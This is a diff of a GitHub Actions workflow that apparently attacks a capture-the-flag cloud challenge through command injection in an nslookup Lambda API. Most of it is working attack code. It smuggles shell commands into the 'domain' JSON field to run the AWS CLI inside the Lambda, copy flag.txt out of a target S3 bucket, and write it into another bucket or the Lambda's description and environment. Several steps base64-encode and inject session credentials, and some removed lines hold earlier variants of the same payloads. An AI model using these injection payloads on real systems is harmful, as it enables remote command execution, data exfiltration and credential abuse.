@@ -1,4 +1,4 @@
-name: CloudEscape Stage 1 - Get Flag v9
+name: CloudEscape Stage 1 - Get Flag v10
 on:
   workflow_dispatch:
   push:
@@ -18,169 +18,200 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Test A - Use /var/task/python3 path
+      - name: Recon - Check Lambda config timeout and role
+        run: |
+          echo "===== Lambda config ====="
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
+          
+          echo "===== cicdRole identity ====="
+          aws sts get-caller-identity 2>&1
+
+      - name: Test 1 - Simple aws s3 ls (no quoting issues)
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # Try different python paths
-          for py in python3 /var/lang/bin/python3 /usr/bin/python3; do
-            PAYLOAD=$(python3 -c "
-            import json
-            cmd = 'x; $py -c \"import boto3; c=boto3.client(\\x27s3\\x27,region_name=\\x27us-east-1\\x27); c.put_object(Bucket=\\x27platform-bucket-009661764077-us-east-1\\x27,Key=\\x27test_\\\$(echo $py|tr / _).txt\\x27,Body=b\\x27HELLO\\x27)\" 2>&1'
-            print(json.dumps({'domain': cmd}))
-            ")
-            echo "=== $py ==="
-            echo "Payload: $PAYLOAD"
-            curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-            echo
-            sleep 5
-          done
-          sleep 10
+          # Simplest possible: just aws s3 ls with output redirected
+          # No Python, no base64, no nested quotes
+          PAYLOAD=$(python3 -c "
+          import json
+          cmd = 'x; /opt/bin/aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 > /tmp/out 2>&1; /opt/bin/aws s3 cp /tmp/out s3://platform-bucket-009661764077-us-east-1/out.txt --region us-east-1 2>&1'
+          print(json.dumps({'domain': cmd}))
+          ")
+          
+          echo "=== Test 1 ==="
+          echo "Payload: $PAYLOAD"
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 11
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
 
-      - name: Test B - Write script via printf (no quoting issues)
+      - name: Test 2 - STS identity + write to S3
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # Use printf with octal escapes to write Python script
-          # printf is a shell builtin, always available in /bin/sh
-          # Script: get flag, put to platform bucket
-          PAYLOAD=$(python3 << 'PYEOF'
+          PAYLOAD=$(python3 -c "
           import json
+          cmd = 'x; /opt/bin/aws sts get-caller-identity --region us-east-1 > /tmp/who 2>&1; /opt/bin/aws s3 cp /tmp/who s3://platform-bucket-009661764077-us-east-1/who.txt --region us-east-1 2>&1'
+          print(json.dumps({'domain': cmd}))
+          ")
           
-          # The Python script we want to execute in Lambda
-          script = "import boto3,traceback\n"
-          script += "c=boto3.client('s3',region_name='us-east-1')\n"
-          script += "try:\n"
-          script += "    r=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')\n"
-          script += "    f=r['Body'].read()\n"
-          script += "    c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)\n"
-          script += "except Exception as ex:\n"
-          script += "    c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='error.txt',Body=str(ex).encode())\n"
+          echo "=== Test 2 ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 11
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/who.txt - --region us-east-1 2>&1
+
+      - name: Test 3 - Get flag and update Lambda description (Lambda own role)
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # Convert to printf format: each char as \NNN octal
-          printf_arg = ''.join(f'\\{ord(c):03o}' for c in script)
+          # Read flag from S3, put it in Lambda description
+          # If Lambda role has s3:GetObject AND lambda:UpdateFunctionConfiguration
+          PAYLOAD=$(python3 -c "
+          import json
+          cmd = 'x; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1 2>&1; /opt/bin/aws lambda update-function-configuration --function-name nslookupv2 --description file:///tmp/flag --region us-east-1 2>&1'
+          print(json.dumps({'domain': cmd}))
+          ")
           
-          cmd = f'x; printf "{printf_arg}" > /tmp/s.py; python3 /tmp/s.py 2>&1'
+          echo "=== Test 3 ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 11
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
+
+      - name: Test 4 - Get flag and update Lambda environment variable
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Get current Lambda config, add FLAG env var
+          PAYLOAD=$(python3 -c "
+          import json
+          cmd = 'x; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1 2>&1; F=$(cat /tmp/flag 2>/dev/null); /opt/bin/aws lambda update-function-configuration --function-name nslookupv2 --environment Variables={FLAG=$F} --region us-east-1 2>&1'
+          print(json.dumps({'domain': cmd}))
+          ")
+          
+          echo "=== Test 4 ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 11
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment' 2>&1
+
+      - name: Test 5 - Use cicdRole creds with aws CLI for S3 copy
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
+          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
+          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
+          
+          PAYLOAD=$(python3 << 'PYEOF'
+          import json, os
+          a = os.environ['AKID_B64']
+          s = os.environ['SKID_B64']
+          t = os.environ['TOKEN_B64']
+          
+          cmd = f'x; export AWS_ACCESS_KEY_ID=$(echo {a}|base64 -d) AWS_SECRET_ACCESS_KEY=$(echo {s}|base64 -d) AWS_SESSION_TOKEN=$(echo {t}|base64 -d) AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1 2>&1'
           
           print(json.dumps({'domain': cmd}))
           PYEOF
           )
           
-          echo "=== Test B: printf method ==="
+          echo "=== Test 5 ==="
           echo "Payload: ${#PAYLOAD} bytes"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
           sleep 12
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
 
-      - name: Test C - Use /var/lang/bin/python3 with -c and proper escaping
+      - name: Test 6 - Use cicdRole creds to get flag and update Lambda description
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # The issue is shell quoting. In /bin/sh:
-          # - Double quotes allow variable expansion
-          # - Single quotes prevent ALL expansion
-          # So we need: /var/lang/bin/python3 -c 'script with double quotes inside'
+          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
+          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
+          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
           
+          # Use cicdRole creds to: read flag from S3, update Lambda description
           PAYLOAD=$(python3 << 'PYEOF'
-          import json
+          import json, os
+          a = os.environ['AKID_B64']
+          s = os.environ['SKID_B64']
+          t = os.environ['TOKEN_B64']
           
-          # Use SINGLE QUOTES for the Python -c argument
-          # Inside Python code, use DOUBLE QUOTES for strings
-          cmd = """x; /var/lang/bin/python3 -c 'import boto3; c=boto3.client("s3",region_name="us-east-1"); r=c.get_object(Bucket="codec4f26c862a321ef5",Key="flag.txt"); f=r["Body"].read(); c.put_object(Bucket="platform-bucket-009661764077-us-east-1",Key="flag.txt",Body=f)' 2>&1"""
+          cmd = f'x; export AWS_ACCESS_KEY_ID=$(echo {a}|base64 -d) AWS_SECRET_ACCESS_KEY=$(echo {s}|base64 -d) AWS_SESSION_TOKEN=$(echo {t}|base64 -d) AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1 2>&1; /opt/bin/aws lambda update-function-configuration --function-name nslookupv2 --description file:///tmp/flag --region us-east-1 2>&1'
           
           print(json.dumps({'domain': cmd}))
           PYEOF
           )
           
-          echo "=== Test C: single-quote python -c ==="
-          echo "Payload: $PAYLOAD"
+          echo "=== Test 6 ==="
+          echo "Payload: ${#PAYLOAD} bytes"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
           sleep 12
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
 
-      - name: Test D - Check if base64 exists in Lambda
+      - name: Test 7 - Direct S3 copy with Lambda own role (no semicolon - use ||)
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # Check what's available: which base64, python3, etc.
-          # Write result to S3 using /opt/bin/aws (which we know exists)
+          # Use || instead of ; to chain commands - this way /opt/nslookup runs first,
+          # and regardless of its result, the aws command runs
           PAYLOAD=$(python3 -c "
           import json
-          cmd = 'x; which base64 python3 /var/lang/bin/python3 /opt/bin/aws > /tmp/tools.txt 2>&1; ls /bin/ >> /tmp/tools.txt 2>&1; /opt/bin/aws s3 cp /tmp/tools.txt s3://platform-bucket-009661764077-us-east-1/tools.txt --region us-east-1 2>&1'
+          cmd = 'x || /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1 2>&1'
           print(json.dumps({'domain': cmd}))
           ")
           
-          echo "=== Test D: check tools ==="
+          echo "=== Test 7 ==="
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
-          sleep 12
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/tools.txt - --region us-east-1 2>&1
+          sleep 11
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
 
-      - name: Test E - Use /opt/bin/aws s3 cp to copy flag
+      - name: Test 8 - Write test string to S3 (verify S3 write works at all)
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # Simplest possible: use /opt/bin/aws s3 cp to copy flag directly
+          # Simplest possible S3 write: echo HELLO to file, then aws s3 cp
           PAYLOAD=$(python3 -c "
           import json
-          cmd = 'x; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1 2>&1'
+          cmd = 'x; echo TESTVAL > /tmp/t; /opt/bin/aws s3 cp /tmp/t s3://platform-bucket-009661764077-us-east-1/test-val.txt --region us-east-1 2>&1'
           print(json.dumps({'domain': cmd}))
           ")
           
-          echo "=== Test E: aws s3 cp flag ==="
-          echo "Payload: $PAYLOAD"
+          echo "=== Test 8 ==="
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
-          sleep 12
+          sleep 11
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
-
-      - name: Test F - Copy flag using /opt/bin/aws with Lambda's own role
-        continue-on-error: true
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # The Lambda already has AWS credentials from its execution role
-          # /opt/bin/aws should pick them up from env vars
-          # Try to copy flag to BOTH platform and site buckets
-          PAYLOAD=$(python3 -c "
-          import json
-          cmd = 'x; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1; /opt/bin/aws s3 cp /tmp/flag s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1; /opt/bin/aws s3 cp /tmp/flag s3://site781fe43f26b9eba3/flag.txt --region us-east-1'
-          print(json.dumps({'domain': cmd}))
-          ")
-          
-          echo "=== Test F: aws s3 cp to both buckets ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 12
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
-          echo "---"
-          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
 
       - name: Final check
         if: always()
         run: |
           echo "===== Platform bucket ====="
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          echo "===== Lambda Description ====="
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
+          echo "===== Lambda Environment ====="
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment' 2>&1
           
-          echo "===== Read tools.txt ====="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/tools.txt - --region us-east-1 2>&1
+          echo "===== Read who.txt ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/who.txt - --region us-east-1 2>&1
           echo
-          echo "===== Read flag ====="
+          echo "===== Read out.txt ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/out.txt - --region us-east-1 2>&1
+          echo
+          echo "===== Read test-val.txt ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/test-val.txt - --region us-east-1 2>&1
+          echo
+          echo "===== Read flag.txt ====="
           aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - --region us-east-1 2>&1
-          echo
-          echo "===== Read error ====="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/error.txt - --region us-east-1 2>&1
-          echo
-          echo "===== Site bucket ====="
-          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
-          echo
-          echo "===== Read site flag ====="
-          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - --region us-east-1 2>&1
